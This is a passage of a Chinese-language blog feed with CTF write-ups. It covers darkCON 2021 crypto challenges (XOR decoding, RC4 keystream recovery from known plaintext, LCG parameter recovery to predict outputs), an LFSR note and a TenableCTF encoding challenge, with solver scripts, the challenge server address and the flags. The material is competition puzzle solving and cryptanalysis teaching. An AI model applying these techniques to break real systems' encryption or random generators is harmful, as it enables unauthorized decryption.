class="number">69735814802922876</span>, <span class="number">34867907401461438</span>, <span class="number">17433953700730719</span>, <span class="number">8716976850365359</span>, <span class="number">4358488425182679</span>, <span class="number">2179244212591339</span>, <span class="number">1089622106295669</span>, <span class="number">544811053147834</span>, <span class="number">272405526573917</span>, <span class="number">136202763286958</span>, <span class="number">68101381643479</span>, <span class="number">34050690821739</span>, <span class="number">17025345410869</span>, <span class="number">8512672705434</span>, <span class="number">4256336352717</span>, <span class="number">2128168176358</span>, <span class="number">1064084088179</span>, <span class="number">532042044089</span>, <span class="number">266021022044</span>, <span class="number">133010511022</span>, <span class="number">66505255511</span>, <span class="number">33252627755</span>, <span class="number">16626313877</span>, <span class="number">8313156938</span>, <span class="number">4156578469</span>, <span class="number">2078289234</span>, <span class="number">1039144617</span>, <span class="number">519572308</span>, <span class="number">259786154</span>, <span class="number">129893077</span>, <span class="number">64946538</span>, <span class="number">32473269</span>, <span class="number">16236634</span>, <span class="number">8118317</span>, <span class="number">4059158</span>, <span class="number">2029579</span>, <span class="number">1014789</span>, <span class="number">507394</span>, <span class="number">253697</span>, <span class="number">126848</span>, <span class="number">63424</span>, <span class="number">31712</span>, <span class="number">15856</span>, <span class="number">7928</span>, <span class="number">3964</span>, <span class="number">1982</span>, <span class="number">991</span>, <span class="number">495</span>, <span class="number">247</span>, <span class="number">123</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">F=[<span class="number">0x17e5b42a8bea57da669427727314c1b5b50a7c11135d48d87fac2aa91c1e96a62c3e815724c0fd9fd338fa7d65e390525a1294fbaa2655e563657b5e699bb732</span>,</span><br><span class="line"><span class="number">0x8d0a0f04d961cb770b28101de8ec775ed16656d32b1e1f7c38b880633954550fc90f6ad1b73895ff65e2edc46e3413e7cc5b234ca2ff25c4eb52ab9a4964e86a</span>,</span><br><span class="line"><span class="number">0xbcf77a6a978c03b4c36ab21d93decf3f218b7f0716fb68276cc64b45754a954f113f8e42077683f793affdd9b9cdf82e0ba2a1428ca408f37694dc721500def</span>,</span><br><span class="line"><span class="number">0xfe42c2d038326f7fc6167eede667c164f85e9dafac7fadea6021bc1dca3f2c6450fb2f5dcd21fc93c352b59d9570abe8660b79ce990830e67a3624ea27a1f369</span>,</span><br><span class="line"><span class="number">0xb7b07abebdb05ed0129ae97f36fd394e74b3371024e2ba4474aee42d410a783dec0598cd1ef32d03234c5426256e966084c98f69bf9a6a1b7b37aad7bc45ffaf</span>,</span><br><span class="line"><span class="number">0x8ebad316ac19807114dedf2bcb3fb398500e978cd8ef7ccad2ac2e77728e729bb8732db6aaf82551d98f1fa0dfd5d38ecbe5e8c1a20bfe72daba8f22f5fa6371</span>,</span><br><span class="line"><span class="number">0x964188a77c0b800fb6a18b6e233f8a0c4185cce96f148d1f8114bf0865a89656d98475b170618861ce86a343ca682423dfcbb9d65285a7e4181089eab827ac6f</span>,</span><br><span class="line"><span class="number">0xd7732af5b47f66d22ce4dba419a4aa49309ea7b6ccac1bbce09186283b66611cbbfce808e4a428b8341564e702a2004a690df7c589bda8956e5b92db69e7b36d</span>,</span><br><span class="line"><span class="number">0xed5b0c69b240ee406df5e4ed7fe355408a307c4b5423546c99d6f5011e9b69de2c45227460bd5520da15ec3dcbab3f07c50ead4c1d4eb202a4a2764f5c3f9208</span>,</span><br><span class="line"><span class="number">0x116468b05dd6f53ae07c96e2f5e89eeda11cc17cff0a1659ae517ce7268bfbc31cc2bd368782476fdd96f067e6831891c5cc1c50df07d9d937dc9c45cdaac132</span>,</span><br><span class="line"><span class="number">0x10b0bec20c0a74bf9fb3fa17966ccddeda04f91923e9361ded969b5d16699174d184258f27d3f083dd1b382fa6f3ec228d053c593a4bef0adec487b5f4f98be2</span>,</span><br><span class="line"><span class="number">0x3a02d0ca2364d7b397b486fc73f8a73f3fa351e3367e28e70851e9af53d1235abb1567d4ddb47e63c7449ddfd3d5aecd7770bb5c15a72fbb69605757753ce1d</span>,</span><br><span class="line"><span class="number">0xd7c2a7f613dd92e811c28171e190b743bbfa0875931cbe7326cc5e72e45ce767f9854c9a70fbd93fd56a590ad3c6d16c1815a6f4595e7005ea3237835bbc3587</span>,</span><br><span class="line"><span class="number">0xb6bfbf43b10d1e98a5d2fe20dc3d805e0c3e4ed170ee3c6c3881c23f3d8ad10d043e17155abdf6d870dae209a64435c2de33d8181e805e675d8d5636395c43f8</span>,</span><br><span class="line"><span class="number">0x14405e18dcc3bf9dc143d0476d06e8c307cd3354ff19f81053627ac88cafe404c9d7552ac29ae90c8f3cd71d9a433722cb4b0aeff61ca581031c8abc32fa6d31</span>,</span><br><span class="line"><span class="number">0x93aaf3c9e80ed96a88d3b5c8234c6ff169db2a860a6c9a501f3ce1a78c87eb4177ffe30c35968ae91d7e75ec401b78d771edad4696da6392685607ca3ac42c0e</span>,</span><br><span class="line"><span class="number">0x6c50dcb1ddc1ee575e86971db3f14f00cb03ca8f457b9cbc4fa7a19466fdafc91b96e88f083ff80748eda149879b9b671b95cb79e2b09432c8f25819caf60ada</span>,</span><br><span class="line"><span class="number">0xb1d7efc822d3cea04cbc5324a78c9025b10a6412c237cdb4fea182336d9dc75e45e578f85b7c122ace5c2dc817a118f1245300f016bca14324577ec75e326a7b</span>,</span><br><span class="line"><span class="number">0x365fc095493db65e35ad3d17ab6bb4b9bc764f74fcf1d865b41d9636ca4ec7980a17a42b06f7888fd38554f3803371d2f9a709ca6591d7bb1a053c82abe9352a</span>,</span><br><span class="line"><span class="number">0xc2c9f3a7aa6752a69dabfdbeaa222bc205278bb7034bc6993875efcb3680e69c7c01a4432ec9d5e85484ba5dd291c6e630a352650c8ebf694ea40a8e12a1b32f</span>,</span><br><span class="line"><span class="number">0xdcb706df8883899c746efad75ff21e6d2be56a93386329c28ba7c1ac2d87b33ed1b103903396e304f48e3743a31b1e477aecc8a7dcb563509b3d69bf6621526c</span>,</span><br><span class="line"><span class="number">0x240b973fa722be5cedb366a3f3f36c3964d14cc273cde00f4834eb9c08acc3a0f38f500d37bc66893b26c94677da629cfca810fd84fc679ee2190480433e2a0f</span>,</span><br><span class="line"><span class="number">0xf79a9c1758da10c6363ec6e8a8f15af81eac25ae794597cd2928787a5ec7dc851a8278f473144d5269619822e37090d3f18318f5c67fc6bd9de9429c917851a4</span>,</span><br><span class="line"><span class="number">0x839025bc53a823c8a1c5a5d76c64b656122a1c89043070110de1b5ced0ea529e53dd5802d240e7bc511a0e79071e7b4214bafb5414f2ab62184d5677cc47b024</span>,</span><br><span class="line"><span class="number">0x2132673aeac17a2a2a1fbf3a8ab2436e654a0c5eed945fedce3bdfa8b5c4b89bf8840ad57aa97a669b4021cd3486d408310ef7ebf9bdd226d95fa5f98ff07023</span>,</span><br><span class="line"><span class="number">0xa3a17c8d8ef3b9358130a5fbf5b50f71060e66779e67fc6837e637ca51efcd9bdf02921c1c28e859ec1bdcbae45aede19782c3109c09fa4efc63a03e8ef53685</span>,</span><br><span class="line"><span class="number">0x121cf2f4c025f605d770eff32c0786774705577e325ffe7841c23d194f517bb9d3cb849992bdb2d89089cb320dfe9829e732ac96de0a0f99e683b08e30e2f0f3</span>,</span><br><span class="line"><span class="number">0x4c3c85a42e907ed36f724c3b70124ce5d2214bfb42ffe997cec22596e3129180339a4589b89824e00a9424a5308b6bad3aeb78ddceff1005ed5d53261fc12077</span>,</span><br><span class="line"><span class="number">0xbe08bb264014f63c1caceb07a92a8ad6aecb4d2a3268f73f5d3d53b1256f20ba15c64e00b43e8555d5424c99118d6a7db06fa63ae16b8fa75587f735c562a8fd</span>,</span><br><span class="line"><span class="number">0x9f985f7342103394f7e91ebddf3620461694f6ee07bd4c3129884a0069cf9bcf827123e1e647b6efc63bee1688a72a22af9017f13d4788ff71b78090c23422c2</span>,</span><br><span class="line"><span class="number">0x46421b56a4e97debd4c3e4f8d4b1575d7dbb9cd7f14978b81c673a71499dab7665bae198190554997621edeec45e687d0c0747714f302b2c48081313bcedb56f</span>,</span><br><span class="line"><span class="number">0xa400e922efde652354894da17396b9148ede9ff06584815ce27de846d7f30d9b2c42e5ce05f03aac3ac42561e5e1d618a2b6279291bf967297b1e45f0468987d</span>,</span><br><span class="line"><span class="number">0x94aa1a26e4ac93ae0b9195be95a365dbc190b03e90766658a4ad21bb0591d7b0ded29c44df528f9194e561970cb15266c300e864df4d0ebc315589990117c2ce</span>,</span><br><span class="line"><span class="number">0x287fa54e7d8bd73d3f7b96702a0baacb624fd7c3220fa13e7ff8c19ce547aab324f555affb90a61e97a785c0ea4ff627e2eda1e35a1124c05427fc5bdc1788a3</span>,</span><br><span class="line"><span class="number">0x95ee463c23d1146e86f9978a7dc390302127149c8b78c60316d11e57e215d629c7118c7104105fbd2fd1738e828390ec49f78f39c6bd2cb790d90395c5c0997f</span>,</span><br><span class="line"><span class="number">0x7d623aa01509d0380805a7b333f97ef8d9670d90c4f913c616d197d17714f026bd8c50ee571b8d38cc540cc24ff0ec601fedd0f54428eed48d8c3903868d6934</span>,</span><br><span class="line"><span class="number">0x832066a95dd7514b7a5b2aac82e90512fcadfc06c3d50b95a8e981a252b006b482fc8c8a1b85b79c8979d8d98856836a583b0fb295ddfbcb6a7a111f752a101d</span>,</span><br><span class="line"><span class="number">0x2297e2ae6f70d25069a16adac93d92696d0daf62930e4e870b457b12ff49d6776e77adbed5215d73c796ebf33e80b922b80a76e6a52e4612bc1b0facba47f4a6</span>,</span><br><span class="line"><span class="number">0x79186e494573075b2b1ca356523e7d123f260a25e32074ff90a31c5d9c993a87d3a9a81377f750bb9b00f57c76eceb54edfd82e7162344259d2b37a8a2d90ec5</span>,</span><br><span class="line"><span class="number">0x81859b0c047178bab149f7bfc5e4fd84a3b77f34c6b4af8210f9f22644ca9c6e2357f453c54f39984a97b38101f42d44928b29f5a66eae9d6620a09851b47d1e</span>,</span><br><span class="line"><span class="number">0x48dabebf34300f1527a002359f6d3c163ac592d9e8b5fb4b3f8abf66a0729311c46fa662fa2f7400e05d7c5d27515ade9cc08d2512368fc2e32410a59c9fb70f</span>,</span><br><span class="line"><span class="number">0x132769a2e99ba475a56d1260f34a352954c5be314fb4cf7f35a4a636eed5e1d3d756776119c1dd27f2dc75a06c078f179d551ee15f604b928d1b60d5fd7701c3</span>,</span><br><span class="line"><span class="number">0x77d58d49a7c9131f37b79e281e0bc74717f31e608d896c71d6c371b8029be344c0d261326eaffb0be5a4cde37483159f2d141a6865b29ad8e1ff7e514d87cfcc</span>,</span><br><span class="line"><span class="number">0x3fad5058ae8b0e1af806f10f344750f7793274076b3401481da3fd654db9c0f12cfcbca7578f835ed9b362a878c7b9b1a144b06a875cf893d6d52af0019ee697</span>,</span><br><span class="line"><span class="number">0x957877839a1d9091df2d611a2243f3a481c1aa2af3454738066530a732a658968c1bc77394a063c557f8da99972a7d824b4aa045dd287ba0ec9ceaa9d4e58aef</span>,</span><br><span class="line"><span class="number">0x971995976225cca200f7664298dfebc3d72a428d042dead744019a7c84f106821baa6c6dc096453cf3eaf3109c66d7b50e214de59e89e2b5c04c4d90626ede11</span>,</span><br><span class="line"><span class="number">0x27cb279b7ff24e62f98b77f75ebbbbe7c7fa31018e2d345aa21de2b8c56e8bfbb5c383b7cb98fc1a49c9d82f497b7a6a36d7acf94ee1a5d891ac7cb4bae56a72</span>,</span><br><span class="line"><span class="number">0x8ac5151ce5eaca335347fc76d7273ed1dc42722221ae27a85a3f8d095025ebe8f4e6ce5a5dea6a263175e4612b6d673307aee0da5b8aff94f8bace77b1b6f54</span>,</span><br><span class="line"><span class="number">0xef55689d6f3de7bfb109803a861aa25310cc9542ed31503fd8ea376d08f81d60af09402b142c2c2d13297f2f129d79aeabfb14a5553f25570322f58252487c23</span>,</span><br><span class="line"><span class="number">0x9937349c6aecc5c533fd1aee1f5e1ab4c7bfaf078d3f03f4b30a4b4e039052bfe6060fb1a1bb39d340145387910307761c5474a2c37fa6591920a513adff2c66</span>,</span><br><span class="line"><span class="number">0xe5839710f0f7fd77cd4880e185547f678653980b213c92dd7cbe10cf0da9315a998d2fe9c8c009060a954fd8a2cddf7a19b410970b8dbb56629eddade8ed9ee5</span>,</span><br><span class="line"><span class="number">0xfff4a1773df4e303411dbd103db2147d4f49eb2153e043848c72fb442855acd5f71321d246d21cb9a9b1ed79cc384994ff68aaf4e46ab5b3f4c94f2fb68d8441</span>,</span><br><span class="line"><span class="number">0x1a97ef902380ec2223a8a756ef3351d18230b620d3cef0c49596d24f762f047dc148b1e82ac3d1e94ca8702cbea5cbc0cdf841d3b23d062182580b2fce1624cb</span>,</span><br><span class="line"><span class="number">0xbe2118c7db2f8677f6906d2fe92697c86c72dd4644ef87afe0bcbb7d9ebb516a80259c708831fe7b85c5dfb0215665a7ec17bc7852a34addb9160a05b0b5a2c</span>,</span><br><span class="line"><span class="number">0x6c0e643a08ab186d2ad85a1b0346921ceac406326957d8e79f0f56c6a00f51b9d14693b364fa7be3bbee2e527e9bcb73e4260782577aeb777be27a3e296b5e03</span>,</span><br><span class="line"><span class="number">0xc1bb2f017d2c30e8c91295dc6784184799913c68cc7ee11f7cd328e25c94413dcba0cc7d92ec7b170db0bef34648ce90882a9fb5ff3ccbc8f4786286f124a4ff</span>,</span><br><span class="line"><span class="number">0xcf5a857feb8f483847a193977ed6532b5a3b3f6d4bfd3c21507f66ce18bcc987f3b104b1f3e657028d8ce7c87a6b1d5b327db2568cd209c8d343b67943620250</span>,</span><br><span class="line"><span class="number">0x4a2b2cdbdf3d70c98b3ad872548ce258b32607f370dfc32d030ebffa731720804e3f751597c0bb80cd878a0d4f8a4b7120f35536f2f8831f095786f543e476a5</span>,</span><br><span class="line"><span class="number">0x3f20ac7028148dcde2fa827fad44e3c4263483f7fa879a6f1e99367ea1a6a4da527ed234c968efcf9423872e47a2d94fcd20d847578ab5ff30a358902b1e2787</span>,</span><br><span class="line"><span class="number">0xedd001110c436c4ccc30e11b5c959be8105a6c58920d50c95e987e0f8cb76619db2c88aebda7b30735d64776ead85c1a71bcb0e5699a6e4286b050a141f5d8b2</span>,</span><br><span class="line"><span class="number">0x1e28e7ad45184e920fb58d14b7d699c901507f6eee8532a88936f90550fcf33f969d5a9e35ebd475714d43a0a663ac31733c0230b9e47cd7783407558cdc4402</span>,</span><br><span class="line"><span class="number">0xc174e180053198d2dded1ed14af14e475eb52d6138278c321026367a22b1ed4e4cf1c09f7d9e8c94d3c11044d474a85e46e5195f7463ece07ea45b4c79c096a5</span>,</span><br><span class="line"><span class="number">0x81983d3b4612607ad124083463d3718e1840ce56c386274354a761298c94c468393ae5d62a216ce16448a35c1570d06241665929dc723fdda7fdffe0b307b93b</span>,</span><br><span class="line"><span class="number">0x70c066054fe3e43dddd7eb7cf56ba5c7e25ff915ee8c6edf6fa2eb462aaa13f676d875be734a68628a54cd18a8e9503d41bc2535058d3ac3732807656730576a</span></span><br><span class="line">]</span><br><span class="line">m=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(F)):</span><br><span class="line">    r = random.randint(<span class="number">1</span>, <span class="number">2</span> ** <span class="number">512</span>)</span><br><span class="line">    print(r)</span><br><span class="line">    decoded = r ^ F[i] ^ raw[i]</span><br><span class="line">    m.append(decoded)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(F)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(m[i])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#darkCON&#123;user_W4rm4ch1ne68_pass_W4RM4CH1N3R0X_t0ny_h4cked_4g41n!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="4-Crypto-Rookie’s-Choice-4-you-51-solves-467-points"><a href="#4-Crypto-Rookie’s-Choice-4-you-51-solves-467-points" class="headerlink" title="4.Crypto/Rookie’s_Choice_4_you(51 solves / 467 points)"></a>4.Crypto/Rookie’s_Choice_4_you(51 solves / 467 points)</h2><p>RC4,已知明文攻击。</p><p>知道flag密文位数为96位（十六进制）故，flag明文为48位。且给了另外一组明文F（大于48位）+密文E，那么我们截取出48位F的明文和其对应的密文E进行异或可以恢复出密码流key。</p><p>恢复的密码流key后再与flag密文异或即可恢复明文。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"></span><br><span class="line">s=<span class="string">b&#x27;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuv&#x27;</span></span><br><span class="line">print(bytes_to_long(s))</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="number">14988820073418128993386148956818953188503689820749454652493179315838436508934291518672867984704712115785893521159542</span>))</span><br><span class="line">a1=<span class="number">0x6162636465666768696a6b6c6d6e6f707172737475767778797a6162636465666768696a6b6c6d6e6f70717273747576</span></span><br><span class="line">a2=<span class="number">0x3d5d841c4df203758189060d7ba5ef0460c90faeae890dc621dfb563a03cc5f728d42794ae8a08102f2766acece427f3</span></span><br><span class="line">key=<span class="number">14198516887274407798935983314536536148442235170437936307787791383244210245090358526986615445961133532508012229448325</span></span><br><span class="line">enc=<span class="number">0x385e95136bdb2a66baa0593e27b8df03228f1785ea9925c768d08b74b06bffe27bd17da1aed51c21342026bdacb173f8</span></span><br><span class="line">print(long_to_bytes(key^enc))</span><br><span class="line">encc=<span class="number">0x6c0fd74818a4542dd8d35d5126fbb044218b4ceaebcf4a8e6895e431f36890a17f8c7ecef5d6554e706727eeafa062b5</span></span><br><span class="line">print(long_to_bytes(key^encc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;darkCON&#123;RC4_1s_w34k_1f_y0u_us3_s4m3_k3y_tw1c3!!&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-Crypto-PokePark-Raising-New-Generation-6-solves-497-points"><a href="#5-Crypto-PokePark-Raising-New-Generation-6-solves-497-points" class="headerlink" title="5.Crypto/PokePark - Raising New Generation        (6 solves / 497 points)"></a>5.Crypto/PokePark - Raising New Generation        (6 solves / 497 points)</h2><blockquote><p>根据交互后的信息可以知道，给出10个数猜出下一个数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 3.16.14.62 5000</span><br></pre></td></tr></table></figure><p>猜测可能是考LCG，未知a,b,n.</p></blockquote><p>先给出LCG的形式：<br>$$<br>x_{n+1}= (x_{n}*a+b) mod n<br>$$<br>先求n,发现，试了几组，发现有一个共同的n，n=2147483647.故用此n反求a和b，再以题目最后一个数位seed生成下一个数。</p><p>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,invert</span><br><span class="line">s=[<span class="number">1110334286</span>,</span><br><span class="line"> <span class="number">1902936019</span>,</span><br><span class="line"> <span class="number">171716562</span>,</span><br><span class="line"> <span class="number">1969719613</span>,</span><br><span class="line"> <span class="number">1617117186</span>,</span><br><span class="line"> <span class="number">335508670</span>,</span><br><span class="line"> <span class="number">1749643315</span>,</span><br><span class="line"> <span class="number">761616834</span>,</span><br><span class="line"> <span class="number">1491592918</span>,</span><br><span class="line"> <span class="number">1625561395</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append((s[i]-s[i-<span class="number">1</span>]))</span><br><span class="line">all_n = []</span><br><span class="line">print(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>])))</span><br><span class="line">print(all_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    <span class="comment"># n=abs(n)</span></span><br><span class="line">    print(n)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n =  <span class="number">2147483647</span></span><br><span class="line">output =  [<span class="number">761616834</span>,</span><br><span class="line"> <span class="number">1491592918</span>,</span><br><span class="line"> <span class="number">1625561395</span>]</span><br><span class="line">d=inverse((output[<span class="number">1</span>]-output[<span class="number">0</span>]),n)</span><br><span class="line">a=(output[<span class="number">2</span>]-output[<span class="number">1</span>])*inverse((output[<span class="number">1</span>]-output[<span class="number">0</span>]),n)%n</span><br><span class="line">ani=inverse(a,n)</span><br><span class="line">b=(output[<span class="number">1</span>]-a*output[<span class="number">0</span>])%n</span><br><span class="line">print(a,b)</span><br><span class="line">a=<span class="number">16807</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line">n=<span class="number">2147483647</span></span><br><span class="line">print(<span class="string">&quot;x=&quot;</span>+<span class="built_in">str</span>((a*<span class="number">1625561395</span>+<span class="number">0</span>)%n))</span><br><span class="line"><span class="comment">#next=523408631</span></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210222192304009.png" alt="image-20210222192304009"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag:darkCON&#123;P0k3m0ns_4nd_RNG!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="6-Crypto-MIMT"><a href="#6-Crypto-MIMT" class="headerlink" title="6.Crypto/MIMT"></a>6.Crypto/MIMT</h2><p>待复现补充</p><h2 id="7-Crypto-Disguised-Wordlets"><a href="#7-Crypto-Disguised-Wordlets" class="headerlink" title="7.Crypto/Disguised Wordlets"></a>7.Crypto/Disguised Wordlets</h2><p>待复现补充</p><h1 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h1><h2 id="1-Reverse-Read"><a href="#1-Reverse-Read" class="headerlink" title="1.Reverse/Read"></a>1.Reverse/Read</h2><h2 id="2-Reverse-Too-Much"><a href="#2-Reverse-Too-Much" class="headerlink" title="2.Reverse/Too Much"></a>2.Reverse/Too Much</h2><h2 id="3-Reverse-ezpz"><a href="#3-Reverse-ezpz" class="headerlink" title="3.Reverse/ezpz"></a>3.Reverse/ezpz</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-五道密码，三道逆向&lt;/p&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;1-Crypto-Risk-Security-Analyst-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Crypto-LSFR</title>
    <link href="http://example.com/2021/02/21/Crypto-LSFR/"/>
    <id>http://example.com/2021/02/21/Crypto-LSFR/</id>
    <published>2021-02-21T06:15:05.000Z</published>
    <updated>2021-02-21T06:18:50.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>此次杭电第四周碰到一道LFSR的题目，之前也有所了解，在此系统的做一个个人笔记。(相关题目会附加链接，方便以后复习)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;此次杭电第四周碰到一道LFSR的题目，之前也有所了解，在此系统的做一个个人笔记。(相关题目会附加链接，方便以后复习)&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>TenableCTF2021-code(wp)</title>
    <link href="http://example.com/2021/02/20/TenableCTF2021-code-wp/"/>
    <id>http://example.com/2021/02/20/TenableCTF2021-code-wp/</id>
    <published>2021-02-20T05:16:21.000Z</published>
    <updated>2021-02-20T05:27:59.759Z</updated>
    
    <content type="html"><![CDATA[<p>-抽空看了一下国外的一个CTF比赛的题，太菜了，只做了两道编码题。</p><h2 id="1-Random-Encryption"><a href="#1-Random-Encryption" class="headerlink" title="1.Random Encryption"></a>1.Random Encryption</h2><p>题目代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&quot;flag&#123;n0t_that_r4ndom&#125;&quot;</span></span><br><span class="line">seeds = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    seeds.append(random.randint(<span class="number">0</span>,<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(<span class="built_in">ord</span>(flag[i]) ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    print(<span class="built_in">str</span>(rands))</span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(seeds)</span><br></pre></td></tr></table></figure><p>给出的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">22</span>, <span class="number">67</span>, <span class="number">142</span>]</span><br><span class="line">[<span class="number">57</span>, <span class="number">51</span>, <span class="number">53</span>]</span><br><span class="line">[<span class="number">97</span>, <span class="number">114</span>, <span class="number">14</span>]</span><br><span class="line">[<span class="number">16</span>, <span class="number">94</span>, <span class="number">107</span>]</span><br><span class="line">[<span class="number">187</span>, <span class="number">79</span>, <span class="number">172</span>]</span><br><span class="line">[<span class="number">138</span>, <span class="number">138</span>, <span class="number">118</span>]</span><br><span class="line">[<span class="number">32</span>, <span class="number">41</span>, <span class="number">8</span>]</span><br><span class="line">[<span class="number">93</span>, <span class="number">104</span>, <span class="number">248</span>]</span><br><span class="line">[<span class="number">112</span>, <span class="number">33</span>, <span class="number">215</span>]</span><br><span class="line">[<span class="number">22</span>, <span class="number">163</span>, <span class="number">8</span>]</span><br><span class="line">[<span class="number">170</span>, <span class="number">21</span>, <span class="number">156</span>]</span><br><span class="line">[<span class="number">183</span>, <span class="number">196</span>, <span class="number">255</span>]</span><br><span class="line">[<span class="number">62</span>, <span class="number">160</span>, <span class="number">64</span>]</span><br><span class="line">[<span class="number">93</span>, <span class="number">124</span>, <span class="number">68</span>]</span><br><span class="line">[<span class="number">53</span>, <span class="number">227</span>, <span class="number">187</span>]</span><br><span class="line">[<span class="number">234</span>, <span class="number">44</span>, <span class="number">74</span>]</span><br><span 